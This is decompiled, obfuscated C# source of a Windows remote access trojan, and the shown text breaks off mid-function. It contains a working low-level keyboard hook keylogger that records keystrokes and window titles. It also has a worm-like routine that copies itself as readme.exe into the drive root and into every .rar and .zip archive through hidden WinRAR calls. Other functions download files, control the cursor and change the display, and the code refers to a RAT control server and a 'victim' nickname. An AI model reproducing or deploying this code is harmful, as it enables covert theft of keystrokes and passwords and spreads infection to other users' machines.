using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using sokayim.My;

namespace sokayim;

[DesignerGenerated]
public class Form1 : Form
{
	public enum MouseEventFlags
	{
		LeftDown = 2,
		LeftUp = 4,
		MiddleDown = 32,
		MiddleUp = 64,
		RightDown = 8,
		RightUp = 16
	}

	public class NativeMethods
	{
		public const int hkdekbixnkvxngtmmmhi = -1;

		public const int ocnyyhjrwnzn = 0;

		public const int wrcdzpgssokax = -6;

		public const int vboirtwfndl = -4;

		public const int adgwrvyujnhx = -2;

		public const int jvljzuaujlckokhecywj = -5;

		public const int dzjybjkgvyn = -1;

		public const int tnpudufviiy = -3;

		public const int xusgbgnswksalpl = 1;

		public const int xphkcycjeuscyy = 0;

		public const int uaupzwvzahuver = 1;

		public const int dtwacxwxafnhewz = 2;

		public const int hvprcbylyrjn = 3;

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int mybylhikjbmfsws(string ssfzhkmvpeexcfbgogfd, int ojakafdvovbbjfo, ref lotnmpkxgxpvturw ncscbnfimtfrkanry);

		[DllImport("user32.dll", CharSet = CharSet.Ansi)]
		public static extern int mjfrgmwmcajdixz(ref lotnmpkxgxpvturw ncscbnfimtfrkanry, int cfhisrzimzgogmglejo);

		public static lotnmpkxgxpvturw bdbslnacziavpj()
		{
			lotnmpkxgxpvturw lotnmpkxgxpvturw = default(lotnmpkxgxpvturw);
			lotnmpkxgxpvturw.mzhgcduasbftvgh = new string(new char[32]);
			lotnmpkxgxpvturw.ydogeutoga = new string(new char[32]);
			lotnmpkxgxpvturw.kjisnewplhrzcaj = checked((short)Conversion.Fix(Marshal.SizeOf((object)lotnmpkxgxpvturw)));
			return lotnmpkxgxpvturw;
		}
	}

	public struct lotnmpkxgxpvturw
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string mzhgcduasbftvgh;

		public short fhrcncccryvsv;

		public short bsdhifvpmkykcsex;

		public short kjisnewplhrzcaj;

		public short pmainhyehtmc;

		public int weetugbfhrgpklghevt;

		public int vorxnjutdeihtgurm;

		public int asionlrhwpembkl;

		public int jjnwulvhwmxabt;

		public int tbsjwkwixkt;

		public short xejawnzzuvosieojwk;

		public short uoyftppkpjpkrwb;

		public short dgbpwpulpgkzrhgtap;

		public short hjsgwsrwlsgcwkwc;

		public short rbzresvakobowuecuu;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
		public string ydogeutoga;

		public short bgfzeypdcltw;

		public short kxkhkyudbim;

		public int gizmewmsxzn;

		public int wtgipxytzsdez;

		public int vdtnkaogtfe;

		public int afkdkdlvor;

		public int jxpopcpyonvonbb;

		public int tpuwycuynlocnjgyc;

		public int oagepemjjwruyeu;

		public int tcxvphjxfkmwdhlold;

		public int cvdfygowfhg;

		public int hzuvvjlnbtcs;

		public int rpwgbipnarzelcoxx;

		public int mallvlibzexzuzb;
	}

	private enum pfkhyoyvhwuaCmd : uint
	{
		GW_HWNDFIRST,
		GW_HWNDLAST,
		GW_HWNDNEXT,
		GW_HWNDPREV,
		GW_OWNER,
		GW_CHILD,
		GW_ENABLEDPOPUP
	}

	private enum SW
	{
		Hide = 0,
		Normal = 1,
		ShowMinimized = 2,
		ShowMaximized = 3,
		ShowNoActivate = 4,
		Show = 5,
		Minimize = 6,
		ShowMinNoActive = 7,
		ShowNA = 8,
		Restore = 9,
		ShowDefault = 10,
		ForceMinimize = 11,
		Max = 11
	}

	public class hook
	{
		public struct KBDLLHOOKSTRUCT
		{
			public int fmtmslspvzzcpcjmskbu;

			public int oexzxkzpvvsopko;

			public int ugonznuerfnuxog;

			public int dwuxdmxfpdhgxzlyelue;

			public int iblodovulodm;
		}

		public enum virtualKey
		{
			K_Return = 13,
			K_Backspace = 8,
			K_Space = 32,
			K_Tab = 9,
			K_Esc = 27,
			K_Control = 17,
			K_LControl = 162,
			K_RControl = 163,
			K_Delete = 46,
			K_End = 35,
			K_Home = 36,
			K_Insert = 45,
			K_Shift = 16,
			K_LShift = 160,
			K_RShift = 161,
			K_Pause = 19,
			K_PrintScreen = 44,
			K_LWin = 91,
			K_RWin = 92,
			K_Alt = 18,
			K_LAlt = 164,
			K_RAlt = 165,
			K_NumLock = 144,
			K_CapsLock = 20,
			K_Up = 38,
			K_Down = 40,
			K_Right = 39,
			K_Left = 37,
			K_F1 = 112,
			K_F2 = 113,
			K_F3 = 114,
			K_F4 = 115,
			K_F5 = 116,
			K_F6 = 117,
			K_F7 = 118,
			K_F8 = 119,
			K_F9 = 120,
			K_F10 = 121,
			K_F11 = 122,
			K_F12 = 123,
			K_F13 = 124,
			K_F14 = 125,
			K_F15 = 126,
			K_F16 = 127,
			K_F17 = 128,
			K_F18 = 129,
			K_F19 = 130,
			K_F20 = 131,
			K_F21 = 132,
			K_F22 = 133,
			K_F23 = 134,
			K_F24 = 135,
			K_Numpad0 = 96,
			K_Numpad1 = 97,
			K_Numpad2 = 98,
			K_Numpad3 = 99,
			K_Numpad4 = 100,
			K_Numpad5 = 101,
			K_Numpad6 = 102,
			K_Numpad7 = 103,
			K_Numpad8 = 104,
			K_Numpad9 = 105,
			K_Num_Add = 107,
			K_Num_Divide = 111,
			K_Num_Multiply = 106,
			K_Num_Subtract = 109,
			K_Num_Decimal = 110,
			K_0 = 48,
			K_1 = 49,
			K_2 = 50,
			K_3 = 51,
			K_4 = 52,
			K_5 = 53,
			K_6 = 54,
			K_7 = 55,
			K_8 = 56,
			K_9 = 57,
			K_A = 65,
			K_B = 66,
			K_C = 67,
			K_D = 68,
			K_E = 69,
			K_F = 70,
			K_G = 71,
			K_H = 72,
			K_I = 73,
			K_J = 74,
			K_K = 75,
			K_L = 76,
			K_M = 77,
			K_N = 78,
			K_O = 79,
			K_P = 80,
			K_Q = 81,
			K_R = 82,
			K_S = 83,
			K_T = 84,
			K_U = 85,
			K_V = 86,
			K_W = 87,
			K_X = 88,
			K_Y = 89,
			K_Z = 90,
			K_Subtract = 189,
			K_Decimal = 190
		}

		private delegate int zkjefisyzxptaul(int eaajujivxdbuadb, int wParam, ref KBDLLHOOKSTRUCT nseuwimyzby);

		private const int retrsebxipj = 257;

		private const short yhjgsgxmebfs = 256;

		private const int sszlljraaog = 260;

		private const int bjbzsjvbalbzhw = 261;

		private IntPtr KeyboardHandle;

		private string LastCheckedForegroundTitle;

		private zkjefisyzxptaul callback;

		public string hoskfmlwnvheraydesae;

		public hook()
		{
			KeyboardHandle = (IntPtr)0;
			LastCheckedForegroundTitle = "";
			callback = null;
		}

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int UnhookWindowsHookEx(int jpizuwupokswup);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int SetWindowsHookExA(int kdmsnejsgjoykn, zkjefisyzxptaul lpfn, int hmod, int dwThreadId);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetAsyncKeyState(int ybipwsyhrmpbrujcexc);

		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CallNextHookEx(int jpizuwupokswup, int nCode, int wParam, KBDLLHOOKSTRUCT nseuwimyzby);

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetForegroundWindow();

		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int GetWindowTextA(int mnnbscdpmfv, [MarshalAs(UnmanagedType.VBByRefStr)] ref string fxzydblrkajlgy, int cchc);

		private string yjolkonnjdxyxmtm()
		{
			string fxzydblrkajlgy = new string('\0', 100);
			GetWindowTextA(GetForegroundWindow(), ref fxzydblrkajlgy, 100);
			return fxzydblrkajlgy.Substring(0, checked(Strings.InStr(fxzydblrkajlgy, "\0", (CompareMethod)0) - 1));
		}

		private object ogccrtlsazktobiet()
		{
			return KeyboardHandle != (IntPtr)0;
		}

		public void HookKeyboard()
		{
			callback = encxpadinezimllgv;
			KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
			_ = KeyboardHandle != (IntPtr)0;
		}

		public void UnhookKeyboard()
		{
			if (Conversions.ToBoolean(ogccrtlsazktobiet()) && UnhookWindowsHookEx((int)KeyboardHandle) != 0)
			{
				KeyboardHandle = (IntPtr)0;
			}
		}

		public int encxpadinezimllgv(int eaajujivxdbuadbsa, int wParam, ref KBDLLHOOKSTRUCT nseuwimyzby)
		{
			string text = yjolkonnjdxyxmtm();
			if (Operators.CompareString(text, LastCheckedForegroundTitle, false) != 0)
			{
				LastCheckedForegroundTitle = text;
				hoskfmlwnvheraydesae = hoskfmlwnvheraydesae + "\r\n----------- " + text + " (" + DateAndTime.get_Now().ToString() + ") ------------\r\n";
			}
			string text2 = "";
			if (wParam == 256 || wParam == 260)
			{
				if (eaajujivxdbuadbsa >= 0 && (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown() & (nseuwimyzby.fmtmslspvzzcpcjmskbu == 83)))
				{
					return 1;
				}
				checked
				{
					switch (nseuwimyzby.fmtmslspvzzcpcjmskbu)
					{
					case 8:
						text2 = "[bkspace]";
						break;
					case 9:
						text2 = "\t";
						break;
					case 13:
						text2 = "\r\n";
						break;
					case 20:
						text2 = ((!((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()) ? "[caps]" : "[/caps]");
						break;
					case 27:
						text2 = "[esc]";
						break;
					case 32:
						text2 = " ";
						break;
					case 37:
						text2 = "[Left Arrow]";
						break;
					case 38:
						text2 = "[Up Arrow]";
						break;
					case 39:
						text2 = "[Right Arrow]";
						break;
					case 40:
						text2 = "[Down Arrow]";
						break;
					case 46:
						text2 = "[delete]";
						break;
					case 48:
					case 49:
					case 50:
					case 51:
					case 52:
					case 53:
					case 54:
					case 55:
					case 56:
					case 57:
						text2 = Conversions.ToString(Strings.ChrW(nseuwimyzby.fmtmslspvzzcpcjmskbu));
						break;
					case 65:
					case 66:
					case 67:
					case 68:
					case 69:
					case 70:
					case 71:
					case 72:
					case 73:
					case 74:
					case 75:
					case 76:
					case 77:
					case 78:
					case 79:
					case 80:
					case 81:
					case 82:
					case 83:
					case 84:
					case 85:
					case 86:
					case 87:
					case 88:
					case 89:
					case 90:
						text2 = Conversions.ToString(Strings.ChrW(nseuwimyzby.fmtmslspvzzcpcjmskbu + 32));
						break;
					case 112:
					case 113:
					case 114:
					case 115:
					case 116:
					case 117:
					case 118:
					case 119:
					case 120:
					case 121:
					case 122:
					case 123:
					case 124:
					case 125:
					case 126:
					case 127:
					case 128:
					case 129:
					case 130:
					case 131:
					case 132:
					case 133:
					case 134:
					case 135:
						text2 = "[F" + Conversions.ToString(nseuwimyzby.fmtmslspvzzcpcjmskbu - 111) + "]";
						break;
					case 160:
					case 161:
						text2 = "[shift]";
						break;
					case 162:
					case 163:
						text2 = "[control]";
						break;
					case 164:
						text2 = "[alt]";
						break;
					case 165:
						text2 = "[alt gr]";
						break;
					default:
						text2 = Conversions.ToString(nseuwimyzby.fmtmslspvzzcpcjmskbu);
						break;
					case 109:
					case 189:
						text2 = "-";
						break;
					case 110:
					case 190:
						text2 = ".";
						break;
					}
				}
			}
			else if (wParam == 257 || wParam == 261)
			{
				switch (nseuwimyzby.fmtmslspvzzcpcjmskbu)
				{
				case 160:
				case 161:
					text2 = "[/shift]";
					break;
				case 162:
				case 163:
					text2 = "[/control]";
					break;
				case 164:
					text2 = "[/alt]";
					break;
				case 165:
					text2 = "[/alt gr]";
					break;
				}
			}
			hoskfmlwnvheraydesae += text2;
			if (Operators.CompareString(text2, "", false) != 0)
			{
			}
			return CallNextHookEx((int)KeyboardHandle, eaajujivxdbuadbsa, wParam, nseuwimyzby);
		}
	}

	private IContainer components;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("draw")]
	private Timer _draw;

	[AccessedThroughProperty("rtb1")]
	private RichTextBox _rtb1;

	[AccessedThroughProperty("rtb2")]
	private RichTextBox _rtb2;

	[AccessedThroughProperty("clipb")]
	private Timer _clipb;

	[AccessedThroughProperty("CAPS")]
	private Timer _CAPS;

	[AccessedThroughProperty("http")]
	private Timer _http;

	[AccessedThroughProperty("runchat")]
	private Timer _runchat;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	public object mynick;

	private const int dvfsibvepuvbvcjfmgb = 61760;

	private const int mmjcoaaforpovk = 274;

	private string klupwnsoobfusydj;

	private const int hkdekbixnkvxngtmmmhi = -1;

	private const int avmwyasamfjxnzdmwie = 1;

	private const long yfwepdkniulr = 2L;

	private const int ahrvpfhceehyeyifh = 32;

	private const int jayfyflcecbieenfauyt = 32;

	private const int ocnyyhjrwnzn = 0;

	private const int xusgbgnswksalpl = 1;

	private const int dzjybjkgvyn = -1;

	private hook gpmnyrnbxpgh;

	private string wayjhryczkvgmesz;

	private string[] options;

	private string text1;

	private string text2;

	private string text3;

	private string text4;

	private string text5;

	private string text6;

	private string text7;

	private string text8;

	private string text9;

	private string text10;

	private const string ecmwhturtyr = "PitonFucker";

	private const string jeephvrfohmrclc = "\r\n";

	public const int dcsgnwpifbwot = 0;

	public const int iejymcmzbmvuadkslc = 256;

	private const int pytnxhmpmozjweztwpw = 12;

	private const int wnxwehrpmmsywmct = 13;

	private int mnnbscdpmfv2;

	private string fxzydblrkajlgy;

	private const int wvlnjfkucuyiykl = 20;

	private const int excdiihixfsn = 20;

	private const int aioidkayuttgm = 2;

	private const int tsweokjztnh = 128;

	private const int zvpuomglowdlvdtx = 64;

	private int tfcwipwwkmfd;

	private const int hawaorbogyvykjdrmes = 524288;

	private const int rsdlurfpftp = 793;

	private long fmalatgeabgate;

	private long bzmruvwszphtb;

	private long korcavetymcfbhxialg;

	private long psisazbhsxxljkrsbr;

	private long wjndfzfhsysxj;

	private string vuaiwaxvnjurrnibc;

	private const int nrnwfezwedf = 2;

	private const int zisjkdbwea = 91;

	private const int yzwgmbsfggessmv = 1;

	private const int foertbyffewf = 2;

	private const int krygtdtubpvkaxtbiid = 4;

	private const int gbimmglhxdycitfk = 61808;

	private const int dojxxhsztjghrmiudsg = 20;

	private const int iranxjolnvcmx = 1;

	private WebClient cnnednnpfoo;

	public object site;

	private string lgtpjnspeljzonvv;

	private string cevwtmzeasddae;

	private int hhlotpvtydwiihm;

	public static System.Timers.Timer TimerFly = new System.Timers.Timer();

	public object sitetoflood;

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer draw
	{
		get
		{
			return _draw;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = draw_Tick;
			if (_draw != null)
			{
				_draw.remove_Tick(eventHandler);
			}
			_draw = value;
			if (_draw != null)
			{
				_draw.add_Tick(eventHandler);
			}
		}
	}

	internal virtual RichTextBox rtb1
	{
		get
		{
			return _rtb1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_rtb1 = value;
		}
	}

	internal virtual RichTextBox rtb2
	{
		get
		{
			return _rtb2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = rtb2_TextChanged;
			if (_rtb2 != null)
			{
				((Control)_rtb2).remove_TextChanged(eventHandler);
			}
			_rtb2 = value;
			if (_rtb2 != null)
			{
				((Control)_rtb2).add_TextChanged(eventHandler);
			}
		}
	}

	internal virtual Timer clipb
	{
		get
		{
			return _clipb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = clipb_Tick;
			if (_clipb != null)
			{
				_clipb.remove_Tick(eventHandler);
			}
			_clipb = value;
			if (_clipb != null)
			{
				_clipb.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer CAPS
	{
		get
		{
			return _CAPS;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = CAPS_Tick;
			if (_CAPS != null)
			{
				_CAPS.remove_Tick(eventHandler);
			}
			_CAPS = value;
			if (_CAPS != null)
			{
				_CAPS.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer http
	{
		get
		{
			return _http;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_http = value;
		}
	}

	internal virtual Timer runchat
	{
		get
		{
			return _runchat;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_runchat = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click_1;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	public Form1()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0019: Expected O, but got Unknown
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		mynick = "victim";
		klupwnsoobfusydj = null;
		gpmnyrnbxpgh = new hook();
		wayjhryczkvgmesz = "";
		cnnednnpfoo = new WebClient();
		site = "http://127.0.0.1/rat/";
		lgtpjnspeljzonvv = "";
		cevwtmzeasddae = "no";
		sitetoflood = "";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_0098: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Expected O, but got Unknown
		//IL_01e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ec: Expected O, but got Unknown
		//IL_0305: Unknown result type (might be due to invalid IL or missing references)
		//IL_030f: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		draw = new Timer(components);
		rtb1 = new RichTextBox();
		rtb2 = new RichTextBox();
		clipb = new Timer(components);
		CAPS = new Timer(components);
		http = new Timer(components);
		runchat = new Timer(components);
		Button1 = new Button();
		Label1 = new Label();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(1000);
		RichTextBox obj = rtb1;
		Point location = new Point(398, 169);
		((Control)obj).set_Location(location);
		((Control)rtb1).set_Name("rtb1");
		RichTextBox obj2 = rtb1;
		Size size = new Size(36, 16);
		((Control)obj2).set_Size(size);
		((Control)rtb1).set_TabIndex(1);
		rtb1.set_Text("");
		((Control)rtb1).set_Visible(false);
		RichTextBox obj3 = rtb2;
		location = new Point(398, 145);
		((Control)obj3).set_Location(location);
		((Control)rtb2).set_Name("rtb2");
		RichTextBox obj4 = rtb2;
		size = new Size(36, 16);
		((Control)obj4).set_Size(size);
		((Control)rtb2).set_TabIndex(2);
		rtb2.set_Text("");
		((Control)rtb2).set_Visible(false);
		http.set_Interval(1000);
		runchat.set_Enabled(true);
		runchat.set_Interval(1);
		((ButtonBase)Button1).set_Image((Image)componentResourceManager.GetObject("Button1.Image"));
		((ButtonBase)Button1).set_ImageAlign((ContentAlignment)16);
		Button button = Button1;
		location = new Point(47, 34);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(109, 29);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("Close server");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		Label label = Label1;
		location = new Point(1, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(212, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("This is test mode. Check hideform to hide it.");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		size = new Size(208, 75);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)rtb2);
		((Control)this).get_Controls().Add((Control)(object)rtb1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private object yotkbeaxnp(string aegfgbhkscvecxwxm)
	{
		WebClient webClient = new WebClient();
		string text = aegfgbhkscvecxwxm.Substring(checked(aegfgbhkscvecxwxm.Length - 4));
		if (!File.Exists(Path.GetTempPath() + "wallpaper" + text))
		{
			webClient.DownloadFile(aegfgbhkscvecxwxm, Path.GetTempPath() + "wallpaper" + text);
		}
		else
		{
			File.Delete(Path.GetTempPath() + "wallpaper" + text);
			webClient.DownloadFile(aegfgbhkscvecxwxm, Path.GetTempPath() + "wallpaper" + text);
		}
		Image val = Image.FromFile(Path.GetTempPath() + "wallpaper" + text);
		val.Save(Path.GetTempPath() + "\\wallpaper.bmp", ImageFormat.get_Bmp());
		string lpvParam = Path.GetTempPath() + "\\wallpaper.bmp";
		SystemParametersInfoA(20, 0, ref lpvParam, 1);
		((Control)this).Hide();
		return null;
	}

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long SetCursorPos(int mxhmsjfswptwic, int YyY);

	[DllImport("User32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern long GetCursorPos(ref Point nllilovusopzxbjckghm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern void mouse_event(MouseEventFlags cfhisrzimzgogmglejo, int hiwwstuziic, int dyy, int cButtons, int iblodovulodm);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDesktopWindow();

	private void StartScreenSaver(bool nwnzifphhpmlljt)
	{
		try
		{
			int desktopWindow = GetDesktopWindow();
			if (nwnzifphhpmlljt)
			{
				SendMessageA_2(desktopWindow, 274, 61760, 0);
			}
			else
			{
				SendKeys.SendWait("{ESC}");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void spread()
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().DirectoryExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Conversions.ToString(DateTime.Today)))
		{
			return;
		}
		int num = 0;
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (((Operators.CompareString(driveInfo.DriveType.ToString(), "Fixed", false) == 0) & driveInfo.IsReady) && num == 0)
			{
				klupwnsoobfusydj = driveInfo.RootDirectory.ToString();
				num = 1;
			}
		}
		((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), klupwnsoobfusydj + "\\readme.exe");
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0)))
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			string[] array = logicalDrives;
			foreach (string xgprfptejjvlwhbs in array)
			{
				findarchive(xgprfptejjvlwhbs);
			}
			Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + Conversions.ToString(DateTime.Today));
		}
	}

	public void findarchive(string xgprfptejjvlwhbs)
	{
		try
		{
			string[] files = Directory.GetFiles(xgprfptejjvlwhbs);
			string[] array = files;
			foreach (string text in array)
			{
				Thread.Sleep(10);
				if (text.Contains(".rar"))
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.Arguments = " a \"" + text + "\" \"" + klupwnsoobfusydj + "\\readme.exe\"";
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.FileName = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0);
					Process.Start(processStartInfo);
					Thread.Sleep(200);
				}
				if (text.Contains(".zip"))
				{
					ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
					processStartInfo2.Arguments = " a \"" + text + "\" \"" + klupwnsoobfusydj + "\\readme.exe\"";
					processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo2.CreateNoWindow = true;
					processStartInfo2.FileName = Strings.Replace(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\WinRAR\\WinRAR.exe", " (x86)", "", 1, -1, (CompareMethod)0);
					Process.Start(processStartInfo2);
					Thread.Sleep(200);
				}
			}
			string[] directories = Directory.GetDirectories(xgprfptejjvlwhbs);
			string[] array2 = directories;
			foreach (string xgprfptejjvlwhbs2 in array2)
			{
				findarchive(xgprfptejjvlwhbs2);
				Thread.Sleep(5);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumDisplaySettingsA(int ssfzhkmvpeexcfbgogfd, int ojakafdvovbbjfo, ref lotnmpkxgxpvturw ncscbnfimtfrkanry);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int ChangeDisplaySettingsA(ref lotnmpkxgxpvturw lotnmpkxgxpvturw, long cyodhpgxhb);

	public void changeRes(int ajootrmnchg, int theHeightz)
	{
		lotnmpkxgxpvturw ncscbnfimtfrkanry = default(lotnmpkxgxpvturw);
		ncscbnfimtfrkanry.mzhgcduasbftvgh = new string(new char[33]);
		ncscbnfimtfrkanry.ydogeutoga = new string(new char[33]);
		ncscbnfimtfrkanry.kjisnewplhrzcaj = checked((short)Marshal.SizeOf(typeof(lotnmpkxgxpvturw)));
		if (0 != EnumDisplaySettingsA(0, -1, ref ncscbnfimtfrkanry))
		{
			ncscbnfimtfrkanry.gizmewmsxzn = ajootrmnchg;
			ncscbnfimtfrkanry.wtgipxytzsdez = theHeightz;
			ncscbnfimtfrkanry.gizmewmsxzn = ajootrmnchg;
			ncscbnfimtfrkanry.wtgipxytzsdez = theHeightz;
			int num = ChangeDisplaySettingsA(ref ncscbnfimtfrkanry, 2L);
			if (num != -1)
			{
				num = ChangeDisplaySettingsA(ref ncscbnfimtfrkanry, 1L);
			}
		}
	}

	public object rfmujicask(string hmhidjxatnndm)
	{
		return Conversions.ToString(Operators.ConcatenateObject(mstlareiwybztsdpyxht(hmhidjxatnndm), akvwinzdjhaadm(hmhidjxatnndm)));
	}

	public object akvwinzdjhaadm(string hmhidjxatnndm)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(hmhidjxatnndm);
		string text = "";
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		foreach (FileInfo fileInfo in files)
		{
			text = text + fileInfo.get_Name() + "\r\n";
		}
		return text;
	}

	public object mstlareiwybztsdpyxht(string hmhidjxatnndm)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(hmhidjxatnndm);
		string text = "";
		DirectoryInfo[] directories = directoryInfo.GetDirectories();
		foreach (DirectoryInfo directoryInfo2 in directories)
		{
